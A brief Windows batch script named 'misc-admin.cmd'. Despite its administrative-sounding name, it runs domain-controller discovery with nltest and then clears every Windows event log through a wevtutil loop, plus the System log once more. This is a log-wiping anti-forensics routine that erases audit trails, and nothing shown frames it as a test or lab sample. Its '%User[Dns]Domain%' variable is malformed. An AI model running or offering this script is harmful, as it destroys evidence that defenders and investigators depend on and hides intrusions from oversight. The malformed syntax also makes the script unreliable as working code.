rem misc-admin.cmd

nltest /dsgetdc:%User[Dns]Domain%

for /F "tokens=*" %%E in ('wevtutil.exe el') DO wevtutil.exe cl "%%E"
wevtutil.exe cl System

